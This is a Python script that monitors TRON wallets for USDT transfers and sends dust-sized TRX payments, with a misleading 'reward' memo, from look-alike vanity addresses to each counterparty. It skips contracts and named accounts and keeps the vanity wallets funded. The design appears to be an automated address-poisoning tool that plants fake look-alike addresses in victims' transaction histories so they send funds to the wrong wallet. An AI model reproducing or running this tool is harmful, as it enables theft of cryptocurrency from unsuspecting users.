import requests
import smtplib
import os
import time
from email.mime.text import MIMEText
from dotenv import load_dotenv
from tronpy import Tron
from tronpy.keys import PrivateKey
from tronpy.providers import HTTPProvider
from decimal import Decimal
import itertools
from datetime import datetime, timedelta

# Load environment variables
load_dotenv()

EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")

WALLET_ADDRESSES = os.getenv("WALLET_ADDRESSES", "").split(",")
VANITY_ADDRESSES = os.getenv("VANITY_ADDRESSES", "").split(",")
VANITY_PRIVATE_KEYS = os.getenv("VANITY_PRIVATE_KEYS", "").split(",")
TRONGRID_API_KEYS = os.getenv("TRONGRID_API_KEY", "").split(",")
FUNDING_PRIVATE_KEY = os.getenv("FUNDING_PRIVATE_KEY")

trongrid_key_cycle = itertools.cycle(TRONGRID_API_KEYS)
client = Tron(HTTPProvider(endpoint_uri="https://api.trongrid.io"))

# Track last transactions and reward times
last_tx_ids = {}
last_reward_times = {}

# Constants
USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
REWARD_DELAY_MINUTES = 30

SKIP_CONTRACT_ADDRESSES = [
    USDT_CONTRACT_ADDRESS,
    "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8",
    "TXpw8TnQoAA6ZySoj53zJTZonKGr2DYZNA",
]

SKIP_WALLET_ADDRESSES = set([
    *WALLET_ADDRESSES,
    *VANITY_ADDRESSES,
    "TU4vEruvZwLLkSfV9bNw12EJTPvNr7Pvaa",
])

if not all([EMAIL_SENDER, EMAIL_PASSWORD, EMAIL_RECEIVER, FUNDING_PRIVATE_KEY]):
    print("Missing email config or funding private key.")
    exit(1)

if len(WALLET_ADDRESSES) != len(VANITY_ADDRESSES) or len(WALLET_ADDRESSES) != len(VANITY_PRIVATE_KEYS):
    print("Mismatch in wallet, vanity addresses, or keys.")
    exit(1)

def is_contract_address(address):
    try:
        account_info = client.get_account(address)
        return 'contract' in account_info and account_info['contract']
    except Exception as e:
        print(f"[is_contract_address] Error: {e}")
        return False

def has_public_name(address):
    try:
        current_key = next(trongrid_key_cycle)
        headers = {"TRON-PRO-API-KEY": current_key}
        url = f"https://api.trongrid.io/v1/accounts/{address}"
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code != 200:
            return False
        data = r.json().get("data", [])
        return bool(data and data[0].get("name"))
    except Exception as e:
        print(f"[has_public_name] Error for {address}: {e}")
        return False

def get_latest_trc20_transaction(wallet_address):
    try:
        key = next(trongrid_key_cycle)
        headers = {"TRON-PRO-API-KEY": key}
        url = f"https://api.trongrid.io/v1/accounts/{wallet_address}/transactions/trc20?limit=1&order_by=block_timestamp,desc"
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 404:
            print(f"[{wallet_address}] Not found on-chain yet.")
            return None
        if r.status_code != 200:
            print(f"[{wallet_address}] Failed to fetch TRC20 txns. Status: {r.status_code}")
            return None
        txs = r.json().get("data", [])
        if not txs:
            return None
        tx = txs[0]
        if tx.get("token_info", {}).get("address") not in SKIP_CONTRACT_ADDRESSES:
            return None
        return {
            "transaction_id": tx.get("transaction_id"),
            "from": tx.get("from"),
            "to": tx.get("to"),
            "value": tx.get("value"),
        }
    except Exception as e:
        print(f"[get_latest_trc20_transaction] Error: {e}")
        return None

def send_email(subject, body):
    try:
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, msg.as_string())
        print("[Email] Notification sent.")
    except Exception as e:
        print("[Email] Failed:", e)

def freeze_trx_for_bandwidth(address, private_key_hex, freeze_amount=Decimal("10")):
    try:
        priv_key = PrivateKey(bytes.fromhex(private_key_hex))
        txn = client.trx.freeze_balance(address, int(freeze_amount * 1_000_000), 3, "BANDWIDTH").build().sign(priv_key)
        result = txn.broadcast().wait()
        print("Bandwidth freeze TX:", result.get("id"))
    except Exception as e:
        print("[freeze_trx_for_bandwidth] Error:", e)

def send_trx(from_address, priv_key_hex, to_address, amount=Decimal("0.000001")):
    try:
        if is_contract_address(to_address):
            return
        now = datetime.utcnow()
        last_time = last_reward_times.get(to_address)
        if last_time and now - last_time < timedelta(minutes=REWARD_DELAY_MINUTES):
            print(f"[{to_address}] Reward throttled.")
            return
        priv_key = PrivateKey(bytes.fromhex(priv_key_hex))
        balance = client.get_account_balance(from_address)
        if balance < amount:
            freeze_trx_for_bandwidth(from_address, priv_key_hex)
            return
        txn = client.trx.transfer(from_address, to_address, int(amount * 1_000_000)).memo("reward_for_usdt_interaction").build().sign(priv_key)
        result = txn.broadcast().wait()
        print(f"[TRX Sent] {to_address} | TxID: {result.get('id')}")
        last_reward_times[to_address] = now
    except Exception as e:
        print("[send_trx] Error:", e)

def get_trx_usd_price():
    try:
        r = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd", timeout=10)
        return Decimal(r.json().get("tron", {}).get("usd"))
    except Exception as e:
        print("[get_trx_usd_price] Error:", e)
        return None

def fund_vanity_wallet_if_low(i):
    addr = VANITY_ADDRESSES[i]
    key = VANITY_PRIVATE_KEYS[i]
    balance = client.get_account_balance(addr)
    if balance < 3:
        price = get_trx_usd_price()
        if price:
            trx_amount = (Decimal("1") / price).quantize(Decimal("0.000001"))
            send_trx_from_funding_wallet(addr, trx_amount)

def send_trx_from_funding_wallet(to_address, amount):
    try:
        priv_key = PrivateKey(bytes.fromhex(FUNDING_PRIVATE_KEY))
        from_address = priv_key.public_key.to_base58check_address()
        balance = client.get_account_balance(from_address)
        if balance < amount:
            print("[Funding Wallet] Insufficient balance.")
            return
        txn = client.trx.transfer(from_address, to_address, int(amount * 1_000_000)).memo("funding_vanity_wallet").build().sign(priv_key)
        result = txn.broadcast().wait()
        print(f"[Funding Sent] {to_address} | TxID: {result.get('id')}")
    except Exception as e:
        print("[send_trx_from_funding_wallet] Error:", e)

# Main monitor loop
print("=== Starting TRON USDT Monitor ===")
while True:
    try:
        for i, my_address in enumerate(WALLET_ADDRESSES):
            fund_vanity_wallet_if_low(i)
            print(f"[Check] Monitoring {my_address}")
            tx = get_latest_trc20_transaction(my_address)

            if tx:
                tx_id = tx["transaction_id"]
                if last_tx_ids.get(my_address) != tx_id:
                    last_tx_ids[my_address] = tx_id
                    sender, receiver = tx["from"], tx["to"]
                    amount = int(tx["value"]) / 1e6

                    if amount < 1:
                        continue

                    interacting_address = sender if receiver == my_address else receiver
                    if (
                        interacting_address in SKIP_WALLET_ADDRESSES or
                        is_contract_address(interacting_address) or
                        has_public_name(interacting_address)
                    ):
                        print(f"[Skip] Disqualified address: {interacting_address}")
                        continue

                    send_email(
                        f"USDT Interaction - {my_address}",
                        f"USDT TX Detected\nWallet: {my_address}\nAmount: {amount:.2f} USDT\nFrom: {sender}\nTo: {receiver}\nTxID: {tx_id}\nView: https://tronscan.org/#/transaction/{tx_id}"
                    )

                    send_trx(VANITY_ADDRESSES[i], VANITY_PRIVATE_KEYS[i], interacting_address)
                else:
                    print("[No New TX]")
            else:
                print(f"[No TX] No TRC20 transaction for {my_address}")
            time.sleep(1)
    except Exception as e:
        print("[Monitor Loop] Error:", e)
    print("Sleeping 30s...\n")
    time.sleep(30)
